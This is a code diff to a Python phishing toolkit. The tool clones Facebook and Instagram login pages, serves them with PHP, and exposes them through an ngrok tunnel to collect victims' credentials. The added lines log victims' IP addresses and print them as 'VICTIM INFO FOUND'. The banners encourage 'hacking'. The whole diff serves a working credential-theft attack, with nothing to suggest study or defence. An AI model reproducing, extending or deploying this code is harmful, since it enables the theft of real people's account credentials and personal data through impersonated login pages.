@@ -12,6 +12,8 @@ import multiprocessing
 from urllib import urlopen
 from platform import system as systemos, architecture
 from wget import download
+import webbrowser
+
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
 
 def connected(host='http://duckduckgo.com'):
@@ -71,7 +73,7 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt && cp WebPages/base.php Server/www/')
+    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt && touch Server/www/ip.txt && cp WebPages/base.php Server/www/ && cp WebPages/ip.php Server/www/')
     if option2 == '1' and social == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
@@ -108,9 +110,14 @@ def runPhishing(social, option2):
         copy_tree("WebPages/Instagram_web/", "Server/www/")    
     elif option2 == '2' and social == 'Instagram':
         copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
+
+
+
+        
+         
         
 def waitCreds():
-    print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
+    print " \n {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
   
     print '''{0}
    _.-=-._     .-, 
@@ -133,6 +140,17 @@ def waitCreds():
             print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
             
         creds.close()
+
+        with open('Server/www/ip.txt') as creds:
+            lines = creds.read().rstrip()
+        if len(lines) != 0: 
+            print '======================================================================'.format(RED, END)
+            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
+            print '======================================================================'.format(RED, END)
+            
+        creds.close()
+        
         with open('Server/www/iplog.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
@@ -231,7 +249,7 @@ def runPEnv():
         exit(0)
 
 def runNgrok():
-    system('./Server/ngrok http 1111 > /dev/null &')
+    system('./Server/ngrok http 8888 > /dev/null &')
     sleep(10)
     system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
@@ -239,7 +257,9 @@ def runNgrok():
     url.close()
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:1111")
+    system("cd Server/www/ && sudo php -S 127.0.0.1:8888")
+
+
 
 if __name__ == "__main__":
     try:
@@ -247,7 +267,12 @@ if __name__ == "__main__":
         runNgrok()
         multiprocessing.Process(target=runServer).start()
         waitCreds()
+        
+        
+    
+	
     except KeyboardInterrupt:
         system('pkill -f ngrok')
         end()
         exit(0)
+
